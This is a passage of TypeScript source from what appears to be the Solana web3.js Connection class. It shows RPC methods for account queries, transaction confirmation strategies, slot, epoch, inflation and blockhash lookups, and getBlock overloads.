GetStakeActivationConfig,\n    epoch?: number,\n  ): Promise<StakeActivationData> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [publicKey.toBase58()],\n      commitment,\n      undefined /* encoding */,\n      {\n        ...config,\n        epoch: epoch != null ? epoch : config?.epoch,\n      },\n    );\n\n    const unsafeRes = await this._rpcRequest('getStakeActivation', args);\n    const res = create(unsafeRes, jsonRpcResult(StakeActivationResult));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get Stake Activation ${publicKey.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the accounts owned by the specified program id\n   *\n   * @return {Promise<Array<{pubkey: PublicKey, account: AccountInfo<Buffer>}>>}\n   */\n  async getProgramAccounts(\n    programId: PublicKey,\n    configOrCommitment: GetProgramAccountsConfig &\n      Readonly<{withContext: true}>,\n  ): Promise<RpcResponseAndContext<GetProgramAccountsResponse>>;\n  // eslint-disable-next-line no-dupe-class-members\n  async getProgramAccounts(\n    programId: PublicKey,\n    configOrCommitment?: GetProgramAccountsConfig | Commitment,\n  ): Promise<GetProgramAccountsResponse>;\n  // eslint-disable-next-line no-dupe-class-members\n  async getProgramAccounts(\n    programId: PublicKey,\n    configOrCommitment?: GetProgramAccountsConfig | Commitment,\n  ): Promise<\n    | GetProgramAccountsResponse\n    | RpcResponseAndContext<GetProgramAccountsResponse>\n  > {\n    const {commitment, config} =\n      extractCommitmentFromConfig(configOrCommitment);\n    const {encoding, ...configWithoutEncoding} = config || {};\n    const args = this._buildArgs(\n      [programId.toBase58()],\n      commitment,\n      encoding || 'base64',\n      {\n        ...configWithoutEncoding,\n        ...(configWithoutEncoding.filters\n          ? {\n              filters: applyDefaultMemcmpEncodingToFilters(\n                configWithoutEncoding.filters,\n              ),\n            }\n          : null),\n      },\n    );\n    const unsafeRes = await this._rpcRequest('getProgramAccounts', args);\n    const baseSchema = array(KeyedAccountInfoResult);\n    const res =\n      configWithoutEncoding.withContext === true\n        ? create(unsafeRes, jsonRpcResultAndContext(baseSchema))\n        : create(unsafeRes, jsonRpcResult(baseSchema));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get accounts owned by program ${programId.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch and parse all the accounts owned by the specified program id\n   *\n   * @return {Promise<Array<{pubkey: PublicKey, account: AccountInfo<Buffer | ParsedAccountData>}>>}\n   */\n  async getParsedProgramAccounts(\n    programId: PublicKey,\n    configOrCommitment?: GetParsedProgramAccountsConfig | Commitment,\n  ): Promise<\n    Array<{\n      pubkey: PublicKey;\n      account: AccountInfo<Buffer | ParsedAccountData>;\n    }>\n  > {\n    const {commitment, config} =\n      extractCommitmentFromConfig(configOrCommitment);\n    const args = this._buildArgs(\n      [programId.toBase58()],\n      commitment,\n      'jsonParsed',\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getProgramAccounts', args);\n    const res = create(\n      unsafeRes,\n      jsonRpcResult(array(KeyedParsedAccountInfoResult)),\n    );\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get accounts owned by program ${programId.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  confirmTransaction(\n    strategy: TransactionConfirmationStrategy,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<SignatureResult>>;\n\n  /** @deprecated Instead, call `confirmTransaction` and pass in {@link TransactionConfirmationStrategy} */\n  // eslint-disable-next-line no-dupe-class-members\n  confirmTransaction(\n    strategy: TransactionSignature,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<SignatureResult>>;\n\n  // eslint-disable-next-line no-dupe-class-members\n  async confirmTransaction(\n    strategy: TransactionConfirmationStrategy | TransactionSignature,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<SignatureResult>> {\n    let rawSignature: string;\n\n    if (typeof strategy == 'string') {\n      rawSignature = strategy;\n    } else {\n      const config = strategy as TransactionConfirmationStrategy;\n\n      if (config.abortSignal?.aborted) {\n        return Promise.reject(config.abortSignal.reason);\n      }\n      rawSignature = config.signature;\n    }\n\n    let decodedSignature;\n\n    try {\n      decodedSignature = bs58.decode(rawSignature);\n    } catch (err) {\n      throw new Error('signature must be base58 encoded: ' + rawSignature);\n    }\n\n    assert(decodedSignature.length === 64, 'signature has invalid length');\n\n    if (typeof strategy === 'string') {\n      return await this.confirmTransactionUsingLegacyTimeoutStrategy({\n        commitment: commitment || this.commitment,\n        signature: rawSignature,\n      });\n    } else if ('lastValidBlockHeight' in strategy) {\n      return await this.confirmTransactionUsingBlockHeightExceedanceStrategy({\n        commitment: commitment || this.commitment,\n        strategy,\n      });\n    } else {\n      return await this.confirmTransactionUsingDurableNonceStrategy({\n        commitment: commitment || this.commitment,\n        strategy,\n      });\n    }\n  }\n\n  private getCancellationPromise(signal?: AbortSignal): Promise<never> {\n    return new Promise<never>((_, reject) => {\n      if (signal == null) {\n        return;\n      }\n      if (signal.aborted) {\n        reject(signal.reason);\n      } else {\n        signal.addEventListener('abort', () => {\n          reject(signal.reason);\n        });\n      }\n    });\n  }\n\n  private getTransactionConfirmationPromise({\n    commitment,\n    signature,\n  }: {\n    commitment?: Commitment;\n    signature: string;\n  }): {\n    abortConfirmation(): void;\n    confirmationPromise: Promise<{\n      __type: TransactionStatus.PROCESSED;\n      response: RpcResponseAndContext<SignatureResult>;\n    }>;\n  } {\n    let signatureSubscriptionId: number | undefined;\n    let disposeSignatureSubscriptionStateChangeObserver:\n      | SubscriptionStateChangeDisposeFn\n      | undefined;\n    let done = false;\n    const confirmationPromise = new Promise<{\n      __type: TransactionStatus.PROCESSED;\n      response: RpcResponseAndContext<SignatureResult>;\n    }>((resolve, reject) => {\n      try {\n        signatureSubscriptionId = this.onSignature(\n          signature,\n          (result: SignatureResult, context: Context) => {\n            signatureSubscriptionId = undefined;\n            const response = {\n              context,\n              value: result,\n            };\n            resolve({__type: TransactionStatus.PROCESSED, response});\n          },\n          commitment,\n        );\n        const subscriptionSetupPromise = new Promise<void>(\n          resolveSubscriptionSetup => {\n            if (signatureSubscriptionId == null) {\n              resolveSubscriptionSetup();\n            } else {\n              disposeSignatureSubscriptionStateChangeObserver =\n                this._onSubscriptionStateChange(\n                  signatureSubscriptionId,\n                  nextState => {\n                    if (nextState === 'subscribed') {\n                      resolveSubscriptionSetup();\n                    }\n                  },\n                );\n            }\n          },\n        );\n        (async () => {\n          await subscriptionSetupPromise;\n          if (done) return;\n          const response = await this.getSignatureStatus(signature);\n          if (done) return;\n          if (response == null) {\n            return;\n          }\n          const {context, value} = response;\n          if (value == null) {\n            return;\n          }\n          if (value?.err) {\n            reject(value.err);\n          } else {\n            switch (commitment) {\n              case 'confirmed':\n              case 'single':\n              case 'singleGossip': {\n                if (value.confirmationStatus === 'processed') {\n                  return;\n                }\n                break;\n              }\n              case 'finalized':\n              case 'max':\n              case 'root': {\n                if (\n                  value.confirmationStatus === 'processed' ||\n                  value.confirmationStatus === 'confirmed'\n                ) {\n                  return;\n                }\n                break;\n              }\n              // exhaust enums to ensure full coverage\n              case 'processed':\n              case 'recent':\n            }\n            done = true;\n            resolve({\n              __type: TransactionStatus.PROCESSED,\n              response: {\n                context,\n                value,\n              },\n            });\n          }\n        })();\n      } catch (err) {\n        reject(err);\n      }\n    });\n    const abortConfirmation = () => {\n      if (disposeSignatureSubscriptionStateChangeObserver) {\n        disposeSignatureSubscriptionStateChangeObserver();\n        disposeSignatureSubscriptionStateChangeObserver = undefined;\n      }\n      if (signatureSubscriptionId != null) {\n        this.removeSignatureListener(signatureSubscriptionId);\n        signatureSubscriptionId = undefined;\n      }\n    };\n    return {abortConfirmation, confirmationPromise};\n  }\n\n  private async confirmTransactionUsingBlockHeightExceedanceStrategy({\n    commitment,\n    strategy: {abortSignal, lastValidBlockHeight, signature},\n  }: {\n    commitment?: Commitment;\n    strategy: BlockheightBasedTransactionConfirmationStrategy;\n  }) {\n    let done: boolean = false;\n    const expiryPromise = new Promise<{\n      __type: TransactionStatus.BLOCKHEIGHT_EXCEEDED;\n    }>(resolve => {\n      const checkBlockHeight = async () => {\n        try {\n          const blockHeight = await this.getBlockHeight(commitment);\n          return blockHeight;\n        } catch (_e) {\n          return -1;\n        }\n      };\n      (async () => {\n        let currentBlockHeight = await checkBlockHeight();\n        if (done) return;\n        while (currentBlockHeight <= lastValidBlockHeight) {\n          await sleep(1000);\n          if (done) return;\n          currentBlockHeight = await checkBlockHeight();\n          if (done) return;\n        }\n        resolve({__type: TransactionStatus.BLOCKHEIGHT_EXCEEDED});\n      })();\n    });\n    const {abortConfirmation, confirmationPromise} =\n      this.getTransactionConfirmationPromise({commitment, signature});\n    const cancellationPromise = this.getCancellationPromise(abortSignal);\n    let result: RpcResponseAndContext<SignatureResult>;\n    try {\n      const outcome = await Promise.race([\n        cancellationPromise,\n        confirmationPromise,\n        expiryPromise,\n      ]);\n      if (outcome.__type === TransactionStatus.PROCESSED) {\n        result = outcome.response;\n      } else {\n        throw new TransactionExpiredBlockheightExceededError(signature);\n      }\n    } finally {\n      done = true;\n      abortConfirmation();\n    }\n    return result;\n  }\n\n  private async confirmTransactionUsingDurableNonceStrategy({\n    commitment,\n    strategy: {\n      abortSignal,\n      minContextSlot,\n      nonceAccountPubkey,\n      nonceValue,\n      signature,\n    },\n  }: {\n    commitment?: Commitment;\n    strategy: DurableNonceTransactionConfirmationStrategy;\n  }) {\n    let done: boolean = false;\n    const expiryPromise = new Promise<{\n      __type: TransactionStatus.NONCE_INVALID;\n      slotInWhichNonceDidAdvance: number | null;\n    }>(resolve => {\n      let currentNonceValue: string | undefined = nonceValue;\n      let lastCheckedSlot: number | null = null;\n      const getCurrentNonceValue = async () => {\n        try {\n          const {context, value: nonceAccount} = await this.getNonceAndContext(\n            nonceAccountPubkey,\n            {\n              commitment,\n              minContextSlot,\n            },\n          );\n          lastCheckedSlot = context.slot;\n          return nonceAccount?.nonce;\n        } catch (e) {\n          // If for whatever reason we can't reach/read the nonce\n          // account, just keep using the last-known value.\n          return currentNonceValue;\n        }\n      };\n      (async () => {\n        currentNonceValue = await getCurrentNonceValue();\n        if (done) return;\n        while (\n          true // eslint-disable-line no-constant-condition\n        ) {\n          if (nonceValue !== currentNonceValue) {\n            resolve({\n              __type: TransactionStatus.NONCE_INVALID,\n              slotInWhichNonceDidAdvance: lastCheckedSlot,\n            });\n            return;\n          }\n          await sleep(2000);\n          if (done) return;\n          currentNonceValue = await getCurrentNonceValue();\n          if (done) return;\n        }\n      })();\n    });\n    const {abortConfirmation, confirmationPromise} =\n      this.getTransactionConfirmationPromise({commitment, signature});\n    const cancellationPromise = this.getCancellationPromise(abortSignal);\n    let result: RpcResponseAndContext<SignatureResult>;\n    try {\n      const outcome = await Promise.race([\n        cancellationPromise,\n        confirmationPromise,\n        expiryPromise,\n      ]);\n      if (outcome.__type === TransactionStatus.PROCESSED) {\n        result = outcome.response;\n      } else {\n        // Double check that the transaction is indeed unconfirmed.\n        let signatureStatus:\n          | RpcResponseAndContext<SignatureStatus | null>\n          | null\n          | undefined;\n        while (\n          true // eslint-disable-line no-constant-condition\n        ) {\n          const status = await this.getSignatureStatus(signature);\n          if (status == null) {\n            break;\n          }\n          if (\n            status.context.slot <\n            (outcome.slotInWhichNonceDidAdvance ?? minContextSlot)\n          ) {\n            await sleep(400);\n            continue;\n          }\n          signatureStatus = status;\n          break;\n        }\n        if (signatureStatus?.value) {\n          const commitmentForStatus = commitment || 'finalized';\n          const {confirmationStatus} = signatureStatus.value;\n          switch (commitmentForStatus) {\n            case 'processed':\n            case 'recent':\n              if (\n                confirmationStatus !== 'processed' &&\n                confirmationStatus !== 'confirmed' &&\n                confirmationStatus !== 'finalized'\n              ) {\n                throw new TransactionExpiredNonceInvalidError(signature);\n              }\n              break;\n            case 'confirmed':\n            case 'single':\n            case 'singleGossip':\n              if (\n                confirmationStatus !== 'confirmed' &&\n                confirmationStatus !== 'finalized'\n              ) {\n                throw new TransactionExpiredNonceInvalidError(signature);\n              }\n              break;\n            case 'finalized':\n            case 'max':\n            case 'root':\n              if (confirmationStatus !== 'finalized') {\n                throw new TransactionExpiredNonceInvalidError(signature);\n              }\n              break;\n            default:\n              // Exhaustive switch.\n              // eslint-disable-next-line @typescript-eslint/no-unused-vars\n              ((_: never) => {})(commitmentForStatus);\n          }\n          result = {\n            context: signatureStatus.context,\n            value: {err: signatureStatus.value.err},\n          };\n        } else {\n          throw new TransactionExpiredNonceInvalidError(signature);\n        }\n      }\n    } finally {\n      done = true;\n      abortConfirmation();\n    }\n    return result;\n  }\n\n  private async confirmTransactionUsingLegacyTimeoutStrategy({\n    commitment,\n    signature,\n  }: {\n    commitment?: Commitment;\n    signature: string;\n  }) {\n    let timeoutId;\n    const expiryPromise = new Promise<{\n      __type: TransactionStatus.TIMED_OUT;\n      timeoutMs: number;\n    }>(resolve => {\n      let timeoutMs = this._confirmTransactionInitialTimeout || 60 * 1000;\n      switch (commitment) {\n        case 'processed':\n        case 'recent':\n        case 'single':\n        case 'confirmed':\n        case 'singleGossip': {\n          timeoutMs = this._confirmTransactionInitialTimeout || 30 * 1000;\n          break;\n        }\n        // exhaust enums to ensure full coverage\n        case 'finalized':\n        case 'max':\n        case 'root':\n      }\n      timeoutId = setTimeout(\n        () => resolve({__type: TransactionStatus.TIMED_OUT, timeoutMs}),\n        timeoutMs,\n      );\n    });\n    const {abortConfirmation, confirmationPromise} =\n      this.getTransactionConfirmationPromise({\n        commitment,\n        signature,\n      });\n    let result: RpcResponseAndContext<SignatureResult>;\n    try {\n      const outcome = await Promise.race([confirmationPromise, expiryPromise]);\n      if (outcome.__type === TransactionStatus.PROCESSED) {\n        result = outcome.response;\n      } else {\n        throw new TransactionExpiredTimeoutError(\n          signature,\n          outcome.timeoutMs / 1000,\n        );\n      }\n    } finally {\n      clearTimeout(timeoutId);\n      abortConfirmation();\n    }\n    return result;\n  }\n\n  /**\n   * Return the list of nodes that are currently participating in the cluster\n   */\n  async getClusterNodes(): Promise<Array<ContactInfo>> {\n    const unsafeRes = await this._rpcRequest('getClusterNodes', []);\n    const res = create(unsafeRes, jsonRpcResult(array(ContactInfoResult)));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get cluster nodes');\n    }\n    return res.result;\n  }\n\n  /**\n   * Return the list of nodes that are currently participating in the cluster\n   */\n  async getVoteAccounts(commitment?: Commitment): Promise<VoteAccountStatus> {\n    const args = this._buildArgs([], commitment);\n    const unsafeRes = await this._rpcRequest('getVoteAccounts', args);\n    const res = create(unsafeRes, GetVoteAccounts);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get vote accounts');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current slot that the node is processing\n   */\n  async getSlot(\n    commitmentOrConfig?: Commitment | GetSlotConfig,\n  ): Promise<number> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getSlot', args);\n    const res = create(unsafeRes, jsonRpcResult(number()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get slot');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current slot leader of the cluster\n   */\n  async getSlotLeader(\n    commitmentOrConfig?: Commitment | GetSlotLeaderConfig,\n  ): Promise<string> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getSlotLeader', args);\n    const res = create(unsafeRes, jsonRpcResult(string()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get slot leader');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch `limit` number of slot leaders starting from `startSlot`\n   *\n   * @param startSlot fetch slot leaders starting from this slot\n   * @param limit number of slot leaders to return\n   */\n  async getSlotLeaders(\n    startSlot: number,\n    limit: number,\n  ): Promise<Array<PublicKey>> {\n    const args = [startSlot, limit];\n    const unsafeRes = await this._rpcRequest('getSlotLeaders', args);\n    const res = create(unsafeRes, jsonRpcResult(array(PublicKeyFromString)));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get slot leaders');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current status of a signature\n   */\n  async getSignatureStatus(\n    signature: TransactionSignature,\n    config?: SignatureStatusConfig,\n  ): Promise<RpcResponseAndContext<SignatureStatus | null>> {\n    const {context, value: values} = await this.getSignatureStatuses(\n      [signature],\n      config,\n    );\n    assert(values.length === 1);\n    const value = values[0];\n    return {context, value};\n  }\n\n  /**\n   * Fetch the current statuses of a batch of signatures\n   */\n  async getSignatureStatuses(\n    signatures: Array<TransactionSignature>,\n    config?: SignatureStatusConfig,\n  ): Promise<RpcResponseAndContext<Array<SignatureStatus | null>>> {\n    const params: any[] = [signatures];\n    if (config) {\n      params.push(config);\n    }\n    const unsafeRes = await this._rpcRequest('getSignatureStatuses', params);\n    const res = create(unsafeRes, GetSignatureStatusesRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get signature status');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current transaction count of the cluster\n   */\n  async getTransactionCount(\n    commitmentOrConfig?: Commitment | GetTransactionCountConfig,\n  ): Promise<number> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getTransactionCount', args);\n    const res = create(unsafeRes, jsonRpcResult(number()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get transaction count',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current total currency supply of the cluster in lamports\n   *\n   * @deprecated Deprecated since RPC v1.2.8. Please use {@link getSupply} instead.\n   */\n  async getTotalSupply(commitment?: Commitment): Promise<number> {\n    const result = await this.getSupply({\n      commitment,\n      excludeNonCirculatingAccountsList: true,\n    });\n    return result.value.total;\n  }\n\n  /**\n   * Fetch the cluster InflationGovernor parameters\n   */\n  async getInflationGovernor(\n    commitment?: Commitment,\n  ): Promise<InflationGovernor> {\n    const args = this._buildArgs([], commitment);\n    const unsafeRes = await this._rpcRequest('getInflationGovernor', args);\n    const res = create(unsafeRes, GetInflationGovernorRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get inflation');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the inflation reward for a list of addresses for an epoch\n   */\n  async getInflationReward(\n    addresses: PublicKey[],\n    epoch?: number,\n    commitmentOrConfig?: Commitment | GetInflationRewardConfig,\n  ): Promise<(InflationReward | null)[]> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [addresses.map(pubkey => pubkey.toBase58())],\n      commitment,\n      undefined /* encoding */,\n      {\n        ...config,\n        epoch: epoch != null ? epoch : config?.epoch,\n      },\n    );\n    const unsafeRes = await this._rpcRequest('getInflationReward', args);\n    const res = create(unsafeRes, GetInflationRewardResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get inflation reward');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the specific inflation values for the current epoch\n   */\n  async getInflationRate(): Promise<InflationRate> {\n    const unsafeRes = await this._rpcRequest('getInflationRate', []);\n    const res = create(unsafeRes, GetInflationRateRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get inflation rate');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the Epoch Info parameters\n   */\n  async getEpochInfo(\n    commitmentOrConfig?: Commitment | GetEpochInfoConfig,\n  ): Promise<EpochInfo> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getEpochInfo', args);\n    const res = create(unsafeRes, GetEpochInfoRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get epoch info');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the Epoch Schedule parameters\n   */\n  async getEpochSchedule(): Promise<EpochSchedule> {\n    const unsafeRes = await this._rpcRequest('getEpochSchedule', []);\n    const res = create(unsafeRes, GetEpochScheduleRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get epoch schedule');\n    }\n    const epochSchedule = res.result;\n    return new EpochSchedule(\n      epochSchedule.slotsPerEpoch,\n      epochSchedule.leaderScheduleSlotOffset,\n      epochSchedule.warmup,\n      epochSchedule.firstNormalEpoch,\n      epochSchedule.firstNormalSlot,\n    );\n  }\n\n  /**\n   * Fetch the leader schedule for the current epoch\n   * @return {Promise<RpcResponseAndContext<LeaderSchedule>>}\n   */\n  async getLeaderSchedule(): Promise<LeaderSchedule> {\n    const unsafeRes = await this._rpcRequest('getLeaderSchedule', []);\n    const res = create(unsafeRes, GetLeaderScheduleRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get leader schedule');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the minimum balance needed to exempt an account of `dataLength`\n   * size from rent\n   */\n  async getMinimumBalanceForRentExemption(\n    dataLength: number,\n    commitment?: Commitment,\n  ): Promise<number> {\n    const args = this._buildArgs([dataLength], commitment);\n    const unsafeRes = await this._rpcRequest(\n      'getMinimumBalanceForRentExemption',\n      args,\n    );\n    const res = create(unsafeRes, GetMinimumBalanceForRentExemptionRpcResult);\n    if ('error' in res) {\n      console.warn('Unable to fetch minimum balance for rent exemption');\n      return 0;\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch a recent blockhash from the cluster, return with context\n   * @return {Promise<RpcResponseAndContext<{blockhash: Blockhash, feeCalculator: FeeCalculator}>>}\n   *\n   * @deprecated Deprecated since RPC v1.9.0. Please use {@link getLatestBlockhash} instead.\n   */\n  async getRecentBlockhashAndContext(commitment?: Commitment): Promise<\n    RpcResponseAndContext<{\n      blockhash: Blockhash;\n      feeCalculator: FeeCalculator;\n    }>\n  > {\n    const {\n      context,\n      value: {blockhash},\n    } = await this.getLatestBlockhashAndContext(commitment);\n    const feeCalculator = {\n      get lamportsPerSignature(): number {\n        throw new Error(\n          'The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is ' +\n            'no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee ' +\n            'for a given message.',\n        );\n      },\n      toJSON() {\n        return {};\n      },\n    };\n    return {\n      context,\n      value: {\n        blockhash,\n        feeCalculator,\n      },\n    };\n  }\n\n  /**\n   * Fetch recent performance samples\n   * @return {Promise<Array<PerfSample>>}\n   */\n  async getRecentPerformanceSamples(\n    limit?: number,\n  ): Promise<Array<PerfSample>> {\n    const unsafeRes = await this._rpcRequest(\n      'getRecentPerformanceSamples',\n      limit ? [limit] : [],\n    );\n    const res = create(unsafeRes, GetRecentPerformanceSamplesRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get recent performance samples',\n      );\n    }\n\n    return res.result;\n  }\n\n  /**\n   * Fetch the fee calculator for a recent blockhash from the cluster, return with context\n   *\n   * @deprecated Deprecated since RPC v1.9.0. Please use {@link getFeeForMessage} instead.\n   */\n  async getFeeCalculatorForBlockhash(\n    blockhash: Blockhash,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<FeeCalculator | null>> {\n    const args = this._buildArgs([blockhash], commitment);\n    const unsafeRes = await this._rpcRequest(\n      'getFeeCalculatorForBlockhash',\n      args,\n    );\n\n    const res = create(unsafeRes, GetFeeCalculatorRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get fee calculator');\n    }\n    const {context, value} = res.result;\n    return {\n      context,\n      value: value !== null ? value.feeCalculator : null,\n    };\n  }\n\n  /**\n   * Fetch the fee for a message from the cluster, return with context\n   */\n  async getFeeForMessage(\n    message: VersionedMessage,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<number | null>> {\n    const wireMessage = toBuffer(message.serialize()).toString('base64');\n    const args = this._buildArgs([wireMessage], commitment);\n    const unsafeRes = await this._rpcRequest('getFeeForMessage', args);\n\n    const res = create(unsafeRes, jsonRpcResultAndContext(nullable(number())));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get fee for message');\n    }\n    if (res.result === null) {\n      throw new Error('invalid blockhash');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch a list of prioritization fees from recent blocks.\n   */\n  async getRecentPrioritizationFees(\n    config?: GetRecentPrioritizationFeesConfig,\n  ): Promise<RecentPrioritizationFees[]> {\n    const accounts = config?.lockedWritableAccounts?.map(key => key.toBase58());\n    const args = accounts?.length ? [accounts] : [];\n    const unsafeRes = await this._rpcRequest(\n      'getRecentPrioritizationFees',\n      args,\n    );\n    const res = create(unsafeRes, GetRecentPrioritizationFeesRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get recent prioritization fees',\n      );\n    }\n    return res.result;\n  }\n  /**\n   * Fetch a recent blockhash from the cluster\n   * @return {Promise<{blockhash: Blockhash, feeCalculator: FeeCalculator}>}\n   *\n   * @deprecated Deprecated since RPC v1.8.0. Please use {@link getLatestBlockhash} instead.\n   */\n  async getRecentBlockhash(\n    commitment?: Commitment,\n  ): Promise<{blockhash: Blockhash; feeCalculator: FeeCalculator}> {\n    try {\n      const res = await this.getRecentBlockhashAndContext(commitment);\n      return res.value;\n    } catch (e) {\n      throw new Error('failed to get recent blockhash: ' + e);\n    }\n  }\n\n  /**\n   * Fetch the latest blockhash from the cluster\n   * @return {Promise<BlockhashWithExpiryBlockHeight>}\n   */\n  async getLatestBlockhash(\n    commitmentOrConfig?: Commitment | GetLatestBlockhashConfig,\n  ): Promise<BlockhashWithExpiryBlockHeight> {\n    try {\n      const res = await this.getLatestBlockhashAndContext(commitmentOrConfig);\n      return res.value;\n    } catch (e) {\n      throw new Error('failed to get recent blockhash: ' + e);\n    }\n  }\n\n  /**\n   * Fetch the latest blockhash from the cluster\n   * @return {Promise<BlockhashWithExpiryBlockHeight>}\n   */\n  async getLatestBlockhashAndContext(\n    commitmentOrConfig?: Commitment | GetLatestBlockhashConfig,\n  ): Promise<RpcResponseAndContext<BlockhashWithExpiryBlockHeight>> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getLatestBlockhash', args);\n    const res = create(unsafeRes, GetLatestBlockhashRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get latest blockhash');\n    }\n    return res.result;\n  }\n\n  /**\n   * Returns whether a blockhash is still valid or not\n   */\n  async isBlockhashValid(\n    blockhash: Blockhash,\n    rawConfig?: IsBlockhashValidConfig,\n  ): Promise<RpcResponseAndContext<boolean>> {\n    const {commitment, config} = extractCommitmentFromConfig(rawConfig);\n    const args = this._buildArgs(\n      [blockhash],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('isBlockhashValid', args);\n    const res = create(unsafeRes, IsBlockhashValidRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to determine if the blockhash `' + blockhash + '`is valid',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the node version\n   */\n  async getVersion(): Promise<Version> {\n    const unsafeRes = await this._rpcRequest('getVersion', []);\n    const res = create(unsafeRes, jsonRpcResult(VersionResult));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get version');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the genesis hash\n   */\n  async getGenesisHash(): Promise<string> {\n    const unsafeRes = await this._rpcRequest('getGenesisHash', []);\n    const res = create(unsafeRes, jsonRpcResult(string()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get genesis hash');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch a processed block from the cluster.\n   *\n   * @deprecated Instead, call `getBlock` using a `GetVersionedBlockConfig` by\n   * setting the `maxSupportedTransactionVersion` property.\n   */\n  async getBlock(\n    slot: number,\n    rawConfig?: GetBlockConfig,\n  ): Promise<BlockResponse | null>;\n\n  /**\n   * @deprecated Instead, call `getBlock` using a `GetVersionedBlockConfig` by\n   * setting the `maxSupportedTransactionVersion` property.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig: GetBlockConfig & {transactionDetails: 'accounts'},\n  ): Promise<AccountsModeBlockResponse | null>;\n\n  /**\n   * @deprecated Instead, call `getBlock` using a `GetVersionedBlockConfig` by\n   * setting the `maxSupportedTransactionVersion` property.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig: GetBlockConfig & {transactionDetails: 'none'},\n  ): Promise<NoneModeBlockResponse | null>;\n\n  /**\n   * Fetch a processed block from the cluster.\n   */\n  // eslint-disable-next-line no-dupe-class-members\n  async getBlock(\n    slot: number,\n    rawConfig?: GetVersionedBlockConfig,\n  ): Promise<VersionedBlockResponse | null>;\n\n  // eslint-disable-next-line 